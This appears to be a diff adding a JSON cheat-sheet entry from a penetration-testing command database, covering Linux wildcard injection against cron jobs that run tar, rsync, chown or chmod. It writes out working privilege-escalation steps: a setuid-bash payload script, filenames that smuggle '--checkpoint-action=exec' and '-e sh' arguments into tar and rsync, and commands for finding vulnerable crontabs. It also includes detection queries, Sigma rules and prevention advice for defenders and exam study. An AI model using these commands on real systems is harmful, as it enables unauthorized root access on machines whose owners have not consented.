@@ -1,0 +1,95 @@
+{
+  "id": "linux-wildcard-injection",
+  "name": "Wildcard Injection - Cron/Script Exploitation via Filenames",
+  "command": "echo '' > '--checkpoint-action=exec=sh shell.sh'",
+  "description": "Wildcard injection exploits shell glob expansion in cron jobs or scripts that use wildcards (tar *, rsync *, chown * etc.). By creating files named as command-line flags, the wildcard expands them into arguments. Most commonly used with tar's --checkpoint feature to execute arbitrary commands when a cron runs tar cf backup.tar *.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "silent",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Cron Abuse",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Linux privilege escalation research; OSCP methodology",
+  "tags": [
+    "wildcard-injection",
+    "cron",
+    "tar",
+    "privilege-escalation",
+    "linux",
+    "filenames-as-arguments"
+  ],
+  "mitre": [
+    "T1053.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nWhen a script or cron job uses a wildcard like:\n  tar cf /backup/archive.tar *\nThe shell expands * to all filenames. If you create files named\nlike command flags, they become arguments to the command.\n\n=== TAR WILDCARD (most common) ===\n  # Create the payload script\n  echo '#!/bin/bash' > shell.sh\n  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh\n  chmod +x shell.sh\n\n  # Create the 'flag' files\n  echo '' > '--checkpoint=1'\n  echo '' > '--checkpoint-action=exec=sh shell.sh'\n\n  # When cron runs: tar cf backup.tar *\n  # It expands to: tar cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1 file2...\n  # tar executes shell.sh at each checkpoint!\n\n  # After cron runs:\n  /tmp/rootbash -p   # root shell\n\n=== RSYNC WILDCARD ===\n  # If cron runs: rsync -a * /backup/\n  echo '' > '-e sh shell.sh'\n  # rsync -e executes a shell command\n\n=== CHOWN WILDCARD ===\n  # If cron runs: chown user:group *\n  echo '' > '--reference=/etc/passwd'\n  # Changes ownership to match /etc/passwd owner (root)\n\n=== CHMOD WILDCARD ===\n  # If cron runs: chmod 700 *\n  echo '' > '--reference=/etc/shadow'\n\n=== FINDING TARGETS ===\n  # Check crontab for wildcards\n  cat /etc/crontab\n  ls -la /etc/cron.d/\n  crontab -l\n  # Look for: tar, rsync, chown, chmod with * in writable dirs\n  # Use pspy to watch what runs",
+  "examples": [
+    {
+      "label": "Create tar checkpoint injection files",
+      "command": "echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'"
+    },
+    {
+      "label": "Check crontab for wildcard targets",
+      "command": "cat /etc/crontab | grep -E '\\*' && ls -la /etc/cron.d/"
+    },
+    {
+      "label": "rsync wildcard injection",
+      "command": "echo '' > '-e sh shell.sh'"
+    }
+  ],
+  "references": [
+    {
+      "title": "Unix Wildcard Injection",
+      "url": "https://www.exploit-db.com/papers/33930"
+    },
+    {
+      "title": "GTFOBins - Tar",
+      "url": "https://gtfobins.github.io/gtfobins/tar/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cron-abuse-pspy",
+      "note": "pspy discovers cron jobs running with wildcards.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Shell glob expansion treats filenames starting with - as command arguments. tar's --checkpoint-action allows arbitrary command execution, making it the most dangerous target.",
+    "prerequisites": "Write access to a directory where a privileged cron job uses wildcards (tar *, rsync *, etc.).",
+    "impact": "Privilege escalation to the user running the cron job (often root).",
+    "detection": "[MITRE T1053.003] Files with names starting with -- in directories used by cron jobs; tar/rsync processes with unexpected arguments.",
+    "artifacts": "Filesystem entries with flag-like names; process execution showing injected arguments.",
+    "splunk_spl": "index=linux sourcetype=syslog process_name=tar\n| where match(process_args, \"--checkpoint-action\")\n| table _time, user, process_name, process_args",
+    "elastic_kql": "process.name:\"tar\" AND process.args:\"--checkpoint-action*\"",
+    "sentinel_kql": "Syslog\n| where ProcessName == \"tar\" and SyslogMessage contains \"--checkpoint-action\"\n| project TimeGenerated, Computer, SyslogMessage",
+    "sigma_rules": "lnx_wildcard_injection_tar",
+    "prevention": "Never use bare wildcards in privileged scripts; use full paths or find -exec; quote arguments; use -- to separate flags from filenames.",
+    "sources": [
+      "https://www.exploit-db.com/papers/33930",
+      "https://attack.mitre.org/techniques/T1053/003/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "Tar wildcard injection - checkpoint action",
+        "logic": "title: Tar Checkpoint Action Execution (Wildcard Injection)\nstatus: experimental\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith: '/tar'\n    CommandLine|contains: '--checkpoint-action'\n  condition: selection\nlevel: critical",
+        "data_source": "sysmon",
+        "log_ids": [
+          "1"
+        ],
+        "attack": [
+          "T1053.003"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate tar backups using checkpoint for progress reporting (rare)",
+        "tuning": "Alert on any --checkpoint-action in automated/cron context"
+      }
+    ]
+  }
+}
